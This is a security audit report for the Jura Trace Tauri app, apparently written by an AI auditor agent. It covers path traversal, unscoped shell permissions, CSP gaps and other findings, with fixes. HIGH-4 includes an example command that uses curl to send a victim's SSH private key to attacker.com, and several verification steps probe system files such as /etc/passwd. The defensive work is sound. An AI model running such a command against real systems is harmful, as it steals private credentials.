# Jura Trace — Pre-Release Security Penetration Test Report

**Date**: 2026-03-25
**Scope**: Full application audit — Tauri IPC boundary, Sidecar API, CSP, capabilities, dependencies, data at rest, new attack surfaces
**Auditor**: Security Auditor Agent (Claude Sonnet 4.6)
**Version audited**: 0.5.0-dev (Sprint 15 complete, Sprint 16 in progress)
**Basis**: Previous audit findings from Phase 2 (2026-03-21) incorporated; this report covers new surfaces and regression checks.

---

## Risk Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 0 |
| HIGH     | 4 |
| MEDIUM   | 5 |
| LOW      | 6 |
| INFO     | 4 |

---

## Findings

---

### [HIGH-1] `read_manifest` and `verify_c2pa` commands accept arbitrary file paths with no canonicalisation

**Severity**: HIGH
**Status**: FIXED (2026-03-25)
**Affected file**: `src-tauri/src/lib.rs` lines 1553–1561

**Description**:
The `read_manifest` and `verify_c2pa` Tauri commands pass the frontend-supplied `file_path` string directly to `c2pa::read_manifest(std::path::Path::new(&file_path))` without any null-byte check, canonicalisation, or path restriction. The `verify_content` inner function performs rigorous path validation (null-byte check + `canonicalize()`), but these two commands bypass that defensive layer entirely.

```rust
// CURRENT — no validation at all
#[tauri::command]
fn read_manifest(file_path: String) -> Result<Option<c2pa::ManifestInfo>, String> {
    c2pa::read_manifest(std::path::Path::new(&file_path))
}

#[tauri::command]
fn verify_c2pa(file_path: String) -> Result<Option<c2pa::ManifestInfo>, String> {
    c2pa::read_manifest(std::path::Path::new(&file_path))
}
```

**Attack scenario**:
A malicious or compromised frontend can call `read_manifest("/etc/passwd")` or `read_manifest("../../sensitive/file")`. The `c2pa-rs` parser will attempt to open and parse the file as JUMBF data. Even though JUMBF parsing on a non-image will fail quickly, the call confirms or denies the existence of the file (oracle attack). More critically, a crafted file placed at any path reachable by the user can be submitted for C2PA parsing — and JUMBF/CBOR parsing has historically been a source of memory-safety issues in C-adjacent libraries.

**Recommendation**:
Apply the same path validation used in `verify_content_inner`:

```rust
#[tauri::command]
fn read_manifest(file_path: String) -> Result<Option<c2pa::ManifestInfo>, String> {
    if file_path.contains('\0') {
        return Err("Invalid file path".to_string());
    }
    let path = std::path::PathBuf::from(&file_path)
        .canonicalize()
        .map_err(|_| "File not found or inaccessible".to_string())?;
    c2pa::read_manifest(&path).map_err(|e| e.to_string())
}
```

Apply identical treatment to `verify_c2pa`. The same fix applies to `check_metadata_before_sign` (line 1889), which calls `PathBuf::from(&asset.file_path)` without canonicalisation after retrieving the path from the database — although this path comes from the database rather than directly from frontend input, a row that was inserted with a traversal path would bypass this.

**Verification**: Attempt to call `invoke('read_manifest', { filePath: '/etc/passwd' })` from the frontend; should return a canonicalisation error rather than a parse error.

---

### [HIGH-2] `extract_watermark_from_path` accepts arbitrary frontend-supplied paths without validation

**Severity**: HIGH
**Status**: FIXED (2026-03-25)
**Affected file**: `src-tauri/src/lib.rs` lines 2047–2059

**Description**:
The `extract_watermark_from_path` command performs only an existence check (`path.exists()`) before opening and processing the file. There is no null-byte check, canonicalisation, or restriction to expected directories. Any path reachable by the user account can be submitted.

```rust
// CURRENT
fn extract_watermark_from_path(
    path: String,
    payload_len_bytes: Option<usize>,
    reference_hex: Option<String>,
) -> Result<watermark::ExtractResult, String> {
    let file_path = PathBuf::from(&path);
    if !file_path.exists() {
        return Err(format!("File not found: {path}"));
    }
    // ... processes file immediately
}
```

**Attack scenario**:
An attacker who can influence the frontend (XSS, compromised Svelte component, malicious IPC call during development) can submit paths such as `/Users/victim/.ssh/id_rsa` or `/var/db/dslocal/nodes/Default/users/root.plist` (macOS). The watermark extraction will fail gracefully, but: (a) the existence/non-existence of sensitive files is confirmed; (b) the `blind_watermark` crate (v0.1, pre-stability) will attempt to open and decode the file as an image, potentially triggering parsing vulnerabilities.

The error message `format!("File not found: {path}")` echoes the user-supplied path, which could aid path-enumeration attacks in a multi-user or logged environment.

**Recommendation**:

```rust
#[tauri::command]
fn extract_watermark_from_path(
    path: String,
    payload_len_bytes: Option<usize>,
    reference_hex: Option<String>,
) -> Result<watermark::ExtractResult, String> {
    if path.contains('\0') {
        return Err("Invalid file path".to_string());
    }
    let file_path = std::path::PathBuf::from(&path)
        .canonicalize()
        .map_err(|_| "File not found or inaccessible".to_string())?;
    let len = payload_len_bytes.unwrap_or(16);
    watermark::extract_watermark(&file_path, len, reference_hex.as_deref())
}
```

**Verification**: Call `invoke('extractWatermarkFromPath', { path: '/etc/passwd' })`; should return a generic inaccessible error, not a parse error.

---

### [HIGH-3] `analyse_video_deepfake` command does not canonicalise its path

**Severity**: HIGH
**Status**: FIXED (2026-03-25)
**Affected file**: `src-tauri/src/lib.rs` lines 1843–1868

**Description**:
The standalone `analyse_video_deepfake` Tauri command (distinct from the path used inside `verify_content_inner`) constructs a `Path` from the raw frontend string and performs only `path.exists()` before sending the file to the sidecar.

```rust
fn analyse_video_deepfake(
    file_path: String,
    mode: String,
    state: State<'_, Mutex<AppState>>,
) -> Result<sidecar::VideoDeepfakeResult, String> {
    let path = std::path::Path::new(&file_path);
    if !path.exists() {
        return Err(format!("File not found: {file_path}"));  // echoes attacker-controlled path
    }
    // Sends to sidecar with no further validation
```

**Attack scenario**:
Same class as HIGH-2. Additionally, the error message echoes `file_path` verbatim, enabling file-path enumeration. The sidecar endpoint (`/forensics/video/deepfake`) will receive and attempt to process arbitrary files up to 500 MB.

**Recommendation**:

```rust
fn analyse_video_deepfake(
    file_path: String,
    mode: String,
    state: State<'_, Mutex<AppState>>,
) -> Result<sidecar::VideoDeepfakeResult, String> {
    if file_path.contains('\0') {
        return Err("Invalid file path".to_string());
    }
    let path = std::path::PathBuf::from(&file_path)
        .canonicalize()
        .map_err(|_| "File not found or inaccessible".to_string())?;

    let valid_modes = ["standard", "deep", "archival"];
    if !valid_modes.contains(&mode.as_str()) {
        return Err(format!(
            "Invalid mode '{}'. Must be one of: standard, deep, archival",
            mode
        ));
    }
    // ...
}
```

**Verification**: Call the command with `filePath: '/etc/passwd'`; should return the generic error, not a sidecar transport error.

---

### [HIGH-4] `shell:allow-execute` and `shell:allow-spawn` are granted without scope restrictions

**Severity**: HIGH
**Status**: FIXED (2026-03-25)
**Affected file**: `src-tauri/capabilities/default.json` lines 9–10

**Description**:
The capability file grants `shell:allow-execute` and `shell:allow-spawn` as flat permissions with no allowed-command scope. In Tauri v2 this means the webview can call `shellExecute` or `shellSpawn` to run **any binary on the system** that is accessible to the user account.

```json
"shell:allow-open",
"shell:allow-execute",   // unrestricted — any executable
"shell:allow-spawn",     // unrestricted — any executable
```

The `shell:allow-open` permission (for opening URLs in the system browser) is legitimate and correctly kept. `shell:allow-execute` and `shell:allow-spawn` are only needed to launch the bundled `jura-sidecar` binary, which is already handled via `app.shell().sidecar("jura-sidecar")` in Rust setup code (not from the frontend). The frontend never needs shell execute or spawn privileges directly.

**Attack scenario**:
Any XSS or prototype-pollution vulnerability in the SvelteKit frontend, or a compromised npm dependency, could call `shell.execute('/bin/sh', ['-c', 'curl attacker.com -d @/Users/victim/.ssh/id_rsa'])`. This would give an attacker full command execution under the user's account — bypassing all other application security controls.

**Recommendation**:
Remove `shell:allow-execute` and `shell:allow-spawn` from `default.json`. The sidecar is launched from Rust setup code; no frontend capability is needed for it. If a future feature genuinely requires shell execution from the frontend, scope it to the exact binary path:

```json
{
  "identifier": "shell:allow-spawn",
  "allow": [{ "name": "jura-sidecar", "sidecar": true }]
}
```

Removing these two lines is a one-line change with high security value.

**Verification**: After removal, confirm `cargo tauri dev` still launches the sidecar correctly (it is launched in Rust, not from frontend).

---

### [MEDIUM-1] CSP is missing `script-src`, `object-src`, `base-uri`, and `frame-ancestors` directives

**Severity**: MEDIUM
**Status**: FIXED (2026-03-25)
**Affected file**: `src-tauri/tauri.conf.json` line 26

**Description**:
The current CSP is:

```
default-src 'self'; img-src 'self' blob:; style-src 'self' 'unsafe-inline'; connect-src 'self' http://127.0.0.1:8200 http://127.0.0.1:11434
```

Missing directives:
- `script-src 'self'` — without an explicit override, `default-src 'self'` covers scripts but the explicit declaration is needed to prevent future accidental loosening
- `object-src 'none'` — prevents Flash, Java applets, and other plugin content
- `base-uri 'self'` — prevents `<base>` tag injection that could redirect all relative URLs
- `frame-ancestors 'none'` — prevents the Tauri webview from being embedded in an external frame (relevant when running in browser fallback mode during development)
- `ipc:` and `http://ipc.localhost` are absent from `connect-src` — Tauri's own IPC transport requires these in the CSP; without them, some Tauri v2 builds may restrict IPC calls depending on platform

**Recommendation**:

```json
"csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' blob:; connect-src ipc: http://ipc.localhost http://127.0.0.1:8200 http://127.0.0.1:11434; object-src 'none'; base-uri 'self'; frame-ancestors 'none';"
```

**Verification**: Run the app in development mode and check the DevTools console for CSP violation reports. The app should function normally.

---

### [MEDIUM-2] `set_db_path` does not validate that the new path is a `.db` extension and does not prevent symlink attacks

**Severity**: MEDIUM
**Status**: FIXED (2026-03-25)
**Affected file**: `src-tauri/src/lib.rs` lines 2299–2393

**Description**:
The `set_db_path` command validates that the parent directory is writable, but does not:
1. Require the new path to have a `.db` (or `.sqlite`) extension — a user or compromised frontend could redirect the database to overwrite any writable file (e.g. an application config or a `.zshrc`)
2. Guard against symlink attacks: the `dir_is_writable` probe creates `.jura_write_probe` to test writability, then deletes it. Between the `is_dir()` check and the probe creation, an attacker could replace the directory with a symlink. However, since the write probe uses `File::create` (not `create_new`), a pre-existing symlink at `.jura_write_probe` would be followed.
3. Does not reject paths that already exist as symlinks to sensitive targets.

Additionally, `set_db_path` does not null-byte check the incoming `new_path`.

**Attack scenario**:
If an attacker can invoke IPC (e.g. via a compromised frontend component), they could call `set_db_path` with `new_path = "/Users/victim/.zshrc"` or `new_path = "/Applications/SomeCriticalApp/data/config.db"`. The command will copy the SQLite database over the target file after passing the writability check.

**Recommendation**:

```rust
async fn set_db_path(
    app_handle: tauri::AppHandle,
    state: State<'_, Mutex<AppState>>,
    new_path: String,
) -> Result<String, String> {
    // Guard: null bytes
    if new_path.contains('\0') {
        return Err("Invalid database path".to_string());
    }

    let new_db_path = PathBuf::from(&new_path);

    // Guard: must end with a recognised database extension
    let ext = new_db_path.extension().and_then(|e| e.to_str()).unwrap_or("");
    if !matches!(ext.to_lowercase().as_str(), "db" | "sqlite" | "sqlite3") {
        return Err("Database path must use a .db, .sqlite, or .sqlite3 extension".to_string());
    }

    // Guard: reject symlinks in the target path
    if let Ok(meta) = std::fs::symlink_metadata(&new_db_path) {
        if meta.file_type().is_symlink() {
            return Err("Database path must not be a symbolic link".to_string());
        }
    }
    // ... remainder unchanged
}
```

**Verification**: Call `set_db_path` with `/tmp/evil.txt`; should return an extension error. Call with a symlink target; should return a symlink error.

---

### [MEDIUM-3] `transcribe` endpoint at `/forensics/transcribe` has no file-size limit

**Severity**: MEDIUM
**Status**: FIXED (2026-03-25)
**Affected file**: `sidecar/app/api/forensics.py` lines 555–590

**Description**:
The `/forensics/transcribe` endpoint reads the entire file with `await file.read()` and checks only for empty files, with no upper size bound. Video and audio files uploaded to other endpoints are protected by `_read_media()` with a 500 MB / 100 MB cap, but the transcription endpoint bypasses this:

```python
@router.post("/transcribe", response_model=TranscriptionResponse)
async def transcribe(
    file: UploadFile = File(...),
    ...
) -> TranscriptionResponse:
    contents = await file.read()        # no size limit
    if len(contents) == 0:
        raise HTTPException(status_code=400, detail="Empty file uploaded")
    # ... no further size check before processing
```

A 10 GB video submitted to this endpoint would be read entirely into process memory, then passed to the `_extract_audio_from_video` function which writes it to a temp file — double the memory footprint.

**Recommendation**:
Apply `_read_media` to the transcription endpoint:

```python
@router.post("/transcribe", response_model=TranscriptionResponse)
async def transcribe(
    file: UploadFile = File(...),
    language: str | None = Query(default=None),
    model_size: str = Query(default="base"),
) -> TranscriptionResponse:
    # Transcription accepts both audio and video; use the video limit as
    # the upper bound since video is the larger container.
    contents = await _read_media(file, _MAX_VIDEO_SIZE, "media")

    if model_size not in ("tiny", "base", "small"):
        raise HTTPException(
            status_code=400,
            detail=f"Invalid model_size '{model_size}'. Must be one of: tiny, base, small",
        )

    result = perform_transcription(contents, language=language, model_size=model_size)
    return TranscriptionResponse(**result)
```

**Verification**: POST a synthetic 600 MB payload to `/forensics/transcribe`; should receive HTTP 413, not an OOM crash.

---

### [MEDIUM-4] Audit chain ordering relies on `created_at` string sort, vulnerable to same-second collision

**Severity**: MEDIUM
**Status**: FIXED (2026-03-25) — millisecond precision timestamps applied to `log_action`
**Affected file**: `src-tauri/src/db.rs` lines 887–895 (write) and 928–932 (verify)

**Description**:
The audit log hash chain relies on ordering rows by `ORDER BY created_at ASC, log_id ASC`. The `prev_hash` for a new entry is fetched as:

```sql
SELECT COALESCE(entry_hash, '') FROM audit_log
ORDER BY created_at DESC, log_id DESC LIMIT 1
```

`created_at` is populated with `chrono::Utc::now().to_rfc3339()`, which has one-second resolution on many platforms. If two actions occur within the same second (e.g. during batch watermarking — which imports multiple assets in a tight loop), their `created_at` values will be identical. The tiebreaker `log_id` is a UUID v4, which sorts lexicographically — UUID v4 lexicographic order does not equal insertion order, so the chain can be ordered differently during write vs verify, producing a false-negative integrity check (the chain appears broken when it is actually intact, or vice versa).

More critically: the `verify_audit_chain` function sorts by `created_at ASC, log_id ASC` but the write path uses `ORDER BY created_at DESC, log_id DESC LIMIT 1` — the sort orders are logically consistent (DESC picks the latest; ASC walks forward), but the UUID tie-breaking introduces non-determinism when timestamps collide.

**Recommendation**:
Add a monotonic `sequence_number INTEGER` column to the audit log, auto-incremented by SQLite, and order by that column instead:

```sql
ALTER TABLE audit_log ADD COLUMN seq INTEGER;
-- In log_action, use ROWID or a separate sequence
```

Alternatively, use RFC 3339 with sub-second precision (`to_rfc3339_opts(SecondsFormat::Millis, true)`) to reduce the collision window to milliseconds, combined with ordering by `(created_at, log_id)` which remains consistent so long as the log_id tie-breaking is the same in both read and write.

Short-term fix (least code change): use `to_rfc3339_opts` with millisecond resolution:

```rust
let now = chrono::Utc::now()
    .to_rfc3339_opts(chrono::SecondsFormat::Millis, true);
```

**Verification**: Submit two import actions within the same second; verify that `verify_audit_chain` returns `true`.

---

### [MEDIUM-5] `requirements.txt` uses range specifiers (`.*`) for several high-risk packages

**Severity**: MEDIUM
**Status**: FIXED (2026-03-25) — all range specifiers replaced with exact `==` pins
**Affected file**: `sidecar/requirements.txt` lines 11–12, 17–20

**Description**:
The documented pin strategy states that all production packages should use exact `==` versions to prevent silent upgrades. However, several packages still use range specifiers (`.*`):

| Package | Specifier | Risk |
|---------|-----------|------|
| `fastapi` | `==0.115.*` | Minor version bumps can introduce breaking changes or CVEs |
| `uvicorn[standard]` | `==0.34.*` | Same |
| `Pillow` | `==11.*` | Pillow has a long history of image-parsing CVEs; minor bumps matter |
| `imagehash` | `==4.*` | |
| `numpy` | `==2.*` | Major ABI changes between minor 2.x versions |
| `opencv-python-headless` | `==4.*` | OpenCV has had CVEs in minor versions |
| `python-dotenv` | `==1.*` | |
| `pydantic` | `==2.*` | |

The `requirements.lock` file (generated by `pip-compile --generate-hashes`) pins to exact versions with hash verification, but the source `requirements.txt` drift means a developer running `pip install -r requirements.txt` without the lock file receives unpinned versions.

**Recommendation**:
Pin all packages to exact versions in `requirements.txt`. The lock file generation command must be re-run after each pin change:

```
fastapi==0.115.12
uvicorn==0.34.0
Pillow==11.2.1
numpy==2.2.4
opencv-python-headless==4.11.0.86
python-dotenv==1.1.0
pydantic==2.11.3
```

(Use current available versions; verify against `requirements.lock` output.)

**Verification**: Run `pip install -r requirements.txt` in a fresh venv and confirm the installed versions match those in `requirements.lock`.

---

### [LOW-1] Raw OS error messages propagated to the frontend via `e.to_string()`

**Severity**: LOW
**Status**: FIXED (2026-03-25) — `import_files`, `sign_asset`, `read_manifest`, `verify_c2pa`, `get_fingerprints`, `find_similar`, and `update_monitor_case_status` migrated to `AppError`; raw errors logged with `log::error!` before returning generic messages
**Affected file**: `src-tauri/src/lib.rs` — multiple `map_err(|e| e.to_string())` call sites

**Description**:
Many Tauri command handlers return errors to the frontend using `.map_err(|e| e.to_string())`, which propagates OS-level messages such as:

- `"No such file or directory (os error 2)"` — confirms path non-existence
- `"Permission denied (os error 13)"` — confirms path exists but is not readable
- SQLite error messages that may reveal schema details
- `rcgen` and `c2pa` crate messages that include file paths

This is a known LOW finding from Phase 2 (finding #18) that has not yet been addressed.

**Recommendation**:
Use the existing `AppError` enum (defined in `src-tauri/src/error.rs`) for all command returns. Map OS errors to generic categories before returning:

```rust
.map_err(|_| "Failed to access the specified file".to_string())
```

For commands that currently return `Result<T, String>`, consider switching to `Result<T, AppError>` so Tauri's error serialisation can produce structured, safe error objects.

---

### [LOW-2] `verify_audit_chain` is not exposed as a Tauri command

**Severity**: LOW
**Status**: FIXED (2026-03-25) — `verify_audit_integrity` command added and registered
**Affected file**: `src-tauri/src/db.rs` (method exists); `src-tauri/src/lib.rs` (not registered)

**Description**:
The `Database::verify_audit_chain()` method is implemented and tested but is not exposed via a Tauri command. This means there is no way for users or the Settings page to trigger an integrity check, and no automated periodic verification runs within the application.

**Recommendation**:
Expose the method as a Tauri command:

```rust
#[tauri::command]
fn verify_audit_integrity(state: State<'_, Mutex<AppState>>) -> Result<bool, String> {
    let app = state.lock().map_err(|e| e.to_string())?;
    app.db.verify_audit_chain().map_err(|e| e.to_string())
}
```

Register it in `invoke_handler` and add an "Audit Integrity" check button to the Settings or Monitor page.

---

### [LOW-3] `import_files` does not canonicalise paths before storing in the database

**Severity**: LOW
**Status**: FIXED (2026-03-25) — paths are canonicalised via `PathBuf::canonicalize()` before storage; null-byte check added; unresolvable paths skipped with a warning that does not echo the raw input
**Affected file**: `src-tauri/src/lib.rs` lines 226, 309

**Description**:
The `import_files` command constructs a `PathBuf::from(path_str)` and stores `path_str.clone()` directly into the database as `file_path`. A path containing `..` sequences, symbolic links, or redundant slashes will be stored in its non-canonical form. When this path is later retrieved and used in `sign_asset` or `check_metadata_before_sign`, the path is used as-is from the database row without re-canonicalisation.

This is a lower-risk issue than the HIGH findings because the path originates from the Tauri `dialog:allow-open` plugin (which presents a native file picker) and is unlikely to contain traversal sequences in normal use. However, a developer using the IPC directly can bypass the file picker.

**Recommendation**:
Canonicalise paths in `import_files` before storage:

```rust
let path = match PathBuf::from(path_str).canonicalize() {
    Ok(p) => p,
    Err(_) => {
        log::warn!("Skipping unresolvable path: {path_str}");
        continue;
    }
};
let canonical_str = path.to_string_lossy().to_string();
// Use canonical_str for file_path in AssetRow, not path_str
```

---

### [LOW-4] `case_notes` field in `update_case_status` is user-free-text stored in SQLite without length cap

**Severity**: LOW
**Status**: FIXED (2026-03-25) — `Database::MAX_CASE_NOTES_BYTES = 10_000` cap enforced in `update_case_status`; returns `rusqlite::Error::InvalidParameterName` surfaced to the user as `AppError::Validation` with a clear message
**Affected file**: `src-tauri/src/db.rs` lines 1113–1130

**Description**:
The `update_case_status` function accepts `notes: Option<&str>` and stores it verbatim. There is no maximum length constraint on the notes field. A user could store multi-megabyte strings as case notes, causing unbounded database growth. This is a local-only DoS concern.

**Recommendation**:
Add a length cap before the SQL call:

```rust
let capped_notes = notes.map(|n| {
    if n.len() > 4096 {
        &n[..4096]
    } else {
        n
    }
});
```

---

### [LOW-5] `fs:allow-write` capability grants write access to `$HOME/**` — overly permissive

**Severity**: LOW
**Status**: FIXED (2026-03-25) — `$HOME/**` removed from `fs:allow-write`
**Affected file**: `src-tauri/capabilities/default.json` lines 27–38

**Description**:
The write capability scope includes `$HOME/**`, giving the webview write access to the entire user home directory. This is broader than necessary. The application writes signed output files and watermarked output files to the same directory as the source file. In practice, users select files from well-known directories (Pictures, Documents, Downloads, Desktop), which are all already explicitly listed.

The recommended configuration from Phase 2 restricted writes to `$APPDATA/**` only. The current config silently reverted to `$HOME/**` for writes.

**Recommendation**:
Remove `$HOME/**` from `fs:allow-write`. The explicit per-directory entries (`$DESKTOP/**`, `$DOCUMENT/**`, `$DOWNLOAD/**`, `$PICTURE/**`, `$VIDEO/**`, `$AUDIO/**`, `$APPDATA/**`) are sufficient for all current use cases.

**Verification**: Test sign and watermark operations on files in each explicitly listed directory.

---

### [LOW-6] Sidecar API key is empty by default with no startup warning in production builds

**Severity**: LOW
**Status**: FIXED (2026-03-25) — production builds auto-generate a 256-bit random session key (two UUID v4 concatenated) when `JURA_SIDECAR_KEY` is absent; key is propagated via `set_var` before sidecar spawn; startup notice logged; dev builds unchanged
**Affected file**: `sidecar/app/config.py` line 25; `src-tauri/src/lib.rs` line 2411

**Description**:
When `JURA_SIDECAR_KEY` is not set, the sidecar accepts unauthenticated requests from any process on the machine (the sidecar binds to `127.0.0.1` so external network access is blocked). In production builds, the Rust setup code reads the key with `std::env::var("JURA_SIDECAR_KEY").unwrap_or_default()` — if the env var is absent, the empty string disables authentication silently. Any process running as the same user (or any process if running as root) can call forensics endpoints freely.

The documentation comment acknowledges this ("If empty (default), the sidecar accepts all requests — suitable for development"), but no runtime warning is emitted in production builds.

**Recommendation**:
In the production sidecar launch path (`cfg!(not(debug_assertions))`), auto-generate a random API key at startup, pass it to the sidecar as an environment variable, and log a notice:

```rust
// In run() setup, production path only
let sidecar_key = if cfg!(debug_assertions) {
    std::env::var("JURA_SIDECAR_KEY").unwrap_or_default()
} else {
    // Generate a strong random key for this session
    let key = uuid::Uuid::new_v4().as_simple().to_string()
        + &uuid::Uuid::new_v4().as_simple().to_string();
    std::env::set_var("JURA_SIDECAR_KEY", &key);
    log::info!("Sidecar API key generated for this session");
    key
};
```

Then pass the key via environment variable when spawning the sidecar process.

---

### [INFO-1] No HTTP redirect following limit on `verify_url`

**Severity**: INFO
**Status**: OPEN
**Affected file**: `src-tauri/src/lib.rs` lines 1754–1761

**Description**:
`reqwest::blocking::Client::new()` is used for the URL verification download. The default `reqwest` client follows up to 10 redirects. There is no explicit limit set. A crafted redirect chain could keep the application busy for an extended period (each redirect resets the 30-second timeout) or redirect through a series of legitimate-looking domains before landing on a private-network address that resolves after DNS resolution (DNS rebinding).

The current SSRF protection (blocklist check) is applied only to the original URL, not to redirect targets. A redirect from `https://legitimate.com/image.jpg` to `http://192.168.1.1/data.jpg` would bypass the host check.

**Recommendation**:
Configure the reqwest client to follow a limited number of redirects and optionally disable automatic redirect following in favour of manual inspection:

```rust
let client = reqwest::blocking::Client::builder()
    .redirect(reqwest::redirect::Policy::limited(3))
    .timeout(std::time::Duration::from_secs(30))
    .build()
    .map_err(|e| AppError::Sidecar(format!("HTTP client error: {e}")))?;
```

For the redirect-to-private-network (DNS rebinding) case, consider using a custom redirect policy that re-validates the target host against the same blocklist.

---

### [INFO-2] Monitor URL CRUD commands are missing from the IPC handler registration

**Severity**: INFO
**Status**: OPEN
**Affected file**: `src-tauri/src/lib.rs` line 2529–2556

**Description**:
The `db.rs` file implements `add_monitor_url`, `remove_monitor_url`, `list_monitor_urls`, `get_monitor_events`, and `update_case_status`, but none of these are exposed as Tauri commands in `lib.rs`. The only monitor-related command registered is `get_monitor_overview`. Either these commands have not yet been implemented in `lib.rs` (Sprint 17/18 work), or they exist elsewhere. If they are added in a future sprint, the path validation and input sanitisation findings in this report (HIGH-1 through HIGH-3) must be applied to any URL or path parameters they accept.

**Recommendation**:
When implementing the Monitor CRUD Tauri commands, apply the following safeguards to user-supplied URLs:
- Validate URL format with `url::Url::parse`
- Store and display the URL safely (it is stored in SQLite via parameterised query, which is already safe from SQL injection)
- Apply the same SSRF blocklist from `verify_url` if the Monitor tab will ever fetch URLs automatically

---

### [INFO-3] `blind_watermark` crate is version 0.1 — pre-stability

**Severity**: INFO
**Status**: ACCEPTED RISK
**Affected file**: `src-tauri/Cargo.toml` line 59

**Description**:
The `blind_watermark = "0.1"` crate has a version less than 1.0, has limited ecosystem visibility, and is not from a major organisation. The previous audit flagged this as partially mitigated. No published CVEs exist for this crate, but the pre-stability version designation means breaking changes and potential security issues may not receive a security advisory. The crate uses `0.1.x` which Cargo will automatically upgrade to within the `0.1.*` range on `cargo update`.

**Recommendation**:
Pin to an exact version: `blind_watermark = "=0.1.2"`. Subscribe to the crate's repository for security notifications. Add to the CI supply chain monitoring checklist.

---

### [INFO-4] `c2pa` crate `is_valid` logic treats `signingCredential.untrusted` as valid

**Severity**: INFO
**Status**: ACCEPTED RISK
**Affected file**: `src-tauri/src/c2pa.rs` lines 319–323

**Description**:
The `is_valid` field on a `ManifestInfo` is computed as:

```rust
let is_valid = reader.validation_status().is_none_or(|statuses| {
    statuses
        .iter()
        .all(|s| s.code() == "signingCredential.untrusted")
});
```

This treats manifests signed with self-signed or unknown certificates as valid. For Jura Trace's threat model (protecting cultural institution assets), this is correct behaviour — Jura Trace signs with its own self-signed certificate, and displaying "invalid" would confuse users. However, it means a manifest signed with any arbitrary self-signed certificate from any generator is also reported as `is_valid = true`. A malicious AI generator could embed a C2PA manifest signed with a self-signed cert to appear "valid" while hiding AI-generation assertions.

The `detect_ai_from_assertions` function mitigates this by scanning assertion content, not just trust status. This is an acceptable design trade-off, but the implication should be documented.

**Recommendation**:
No code change required. Document in the UI and user guide that "C2PA Verified" means "structurally valid manifest" not "trusted third-party signature", consistent with Jura Trace's self-signed model.

---

## STRIDE Summary Table

| Threat Category | Finding | Mitigation Status |
|-----------------|---------|------------------|
| **Spoofing** | INFO-4: Self-signed cert accepts any self-signed signer as valid | Accepted risk — documented |
| **Spoofing** | LOW-6: Sidecar unauthenticated in default config | Fixed (2026-03-25) — session key auto-generated in production |
| **Tampering** | MEDIUM-4: Audit chain ordering non-deterministic on same-second entries | Fixed (2026-03-25) |
| **Tampering** | HIGH-1/2/3: Unvalidated file paths could direct parsing at tampered files | Fixed (2026-03-25) |
| **Repudiation** | LOW-2: `verify_audit_chain` not exposed to user | Fixed (2026-03-25) |
| **Information Disclosure** | LOW-1: OS error messages echo file paths | Fixed (2026-03-25) — high-risk commands migrated to AppError |
| **Information Disclosure** | HIGH-1/2/3: Path existence oracle via error messages | Fixed (2026-03-25) |
| **Information Disclosure** | INFO-1: Redirect target not re-validated (DNS rebinding) | Open |
| **Denial of Service** | MEDIUM-3: `/transcribe` endpoint has no size limit | Fixed (2026-03-25) |
| **Denial of Service** | LOW-4: Case notes unbounded length | Fixed (2026-03-25) — 10 000-byte cap |
| **Denial of Service** | MEDIUM-5: Unpinned Python deps could introduce DoS via dependency upgrade | Fixed (2026-03-25) — exact pins applied |
| **Elevation of Privilege** | HIGH-4: Unrestricted `shell:allow-execute` / `shell:allow-spawn` | Fixed (2026-03-25) |
| **Elevation of Privilege** | MEDIUM-2: `set_db_path` can overwrite arbitrary files | Fixed (2026-03-25) |
| **Elevation of Privilege** | LOW-5: `fs:allow-write` covers entire `$HOME` | Fixed (2026-03-25) |

---

## Confirmed Good Patterns (Regression Check)

The following security controls from the Phase 2 audit are confirmed in place and functioning:

| Control | Location | Status |
|---------|----------|--------|
| SSRF prevention — URL blocklist | `lib.rs:1727–1752` | Confirmed |
| Path canonicalisation in `verify_content` | `lib.rs:631–639` | Confirmed |
| File size limit (200 MB) | `lib.rs:199,250` | Confirmed |
| Image dimension bomb guard (20,000 px) | `lib.rs:201,267` | Confirmed |
| Sidecar bound to `127.0.0.1` only | `main.py:96` | Confirmed |
| Sidecar API key middleware | `main.py:68–87` | Confirmed |
| FastAPI docs disabled | `main.py:61–63` | Confirmed |
| `withGlobalTauri: false` | `tauri.conf.json:13` | Confirmed |
| All SQLite queries parameterised | `db.rs` throughout | Confirmed |
| SHA-256 audit hash chain | `db.rs:866–916` | Confirmed |
| C2PA private key permissions 0600 | `c2pa.rs:168–177` | Confirmed |
| URL query-string redaction in logs | `lib.rs:1701–1708` | Confirmed |
| Temp file cleanup with `tempfile::tempdir()` | `lib.rs:1811` | Confirmed |
| `data:` absent from CSP `img-src` | `tauri.conf.json:26` | Confirmed |
| LIKE metacharacter escaping | `db.rs:469–476` | Confirmed |
| Video/audio size limits in sidecar | `forensics.py:99–130` | Confirmed |

---

## Recommendations Priority Matrix

| Priority | Finding | Effort | Impact |
|----------|---------|--------|--------|
| P1 — Fix before release | HIGH-4: Remove `shell:allow-execute` and `shell:allow-spawn` | Tiny (delete 2 lines) | Critical — prevents arbitrary code execution |
| P1 — Fix before release | HIGH-1: Canonicalise paths in `read_manifest` / `verify_c2pa` | Small (5 lines × 2) | High — closes path traversal oracle |
| P1 — Fix before release | HIGH-2: Canonicalise paths in `extract_watermark_from_path` | Small (5 lines) | High — closes path traversal oracle |
| P1 — Fix before release | HIGH-3: Canonicalise paths in `analyse_video_deepfake` | Small (5 lines) | High — closes path traversal oracle + path echo |
| P1 — Fix before release | MEDIUM-3: Add size limit to `/forensics/transcribe` | Small (2 lines) | High — prevents OOM via large upload |
| P2 — Fix in Sprint 16 | MEDIUM-1: Harden CSP with missing directives | Tiny (1 line) | Medium — defence in depth |
| P2 — Fix in Sprint 16 | MEDIUM-2: Validate extension + symlinks in `set_db_path` | Small (10 lines) | Medium — prevents file overwrite |
| P2 — Fix in Sprint 16 | LOW-5: Remove `$HOME/**` from `fs:allow-write` | Tiny (1 line) | Low-Medium — tightens write scope |
| P3 — Fix before v1.0 | MEDIUM-4: Use millisecond timestamps in audit chain | Small | Medium — audit integrity |
| P3 — Fix before v1.0 | MEDIUM-5: Pin Python deps to exact versions | Small | Medium — supply chain — **FIXED** |
| P3 — Fix before v1.0 | LOW-2: Expose `verify_audit_chain` as Tauri command | Small | Low — user visibility — **FIXED** |
| P3 — Fix before v1.0 | LOW-6: Auto-generate sidecar key in production | Medium | Low-Medium — **FIXED** |
| P4 — Post-v1.0 | LOW-1: Replace `e.to_string()` with typed errors | Large | Low — information hygiene — **FIXED** |
| P4 — Post-v1.0 | LOW-3: Canonicalise paths in `import_files` | Small | Low — **FIXED** |
